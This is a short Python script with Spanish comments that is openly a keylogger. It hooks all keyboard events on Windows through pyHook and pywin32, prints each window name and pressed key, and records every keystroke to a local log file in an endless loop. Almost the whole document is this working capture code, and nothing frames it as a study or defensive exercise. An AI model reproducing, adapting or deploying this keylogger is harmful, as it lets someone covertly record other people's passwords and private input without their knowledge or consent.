#Es necesario descargarse las librerias pyHook y pywin32
import pyHook, pythoncom, sys, logging, time, datetime
destino= 'C:\\ruta\\keylogger.txt'

#Se ejecuta cada vez que se pulsa una tecla
def OnKeyboardEvent(event):
  #Escribir log en keylogger.txt
  logging.basicConfig(filename=destino, level= logging.DEBUG, format='%(message)s')
  print('WindowName:', event.WindowName) #Nombre de la ventana
  print('Window:', event.Window) #ID de la ventana
  print('Key:', event.Key) #Tecla pulsada
  #Se registra la tecla escrita en el nivel DEBUG 
  logging.log(logging.DEBUG, event.Key)
  return True
  
hooks_manager= pyHook.HookManager() #Administrador de hooks
hooks_manager.KeyDown= OnKeyboardEvent #Se indica la función a ejecutar cuando se produzca el evento KeyDown
hooks_manager.HookKeyboard() #Activa el hook del teclado

#Mantiene vivo el programa y procesa los mensajes pendientes de Windows
while True:
  pythoncom.PumpWaitingMessages()
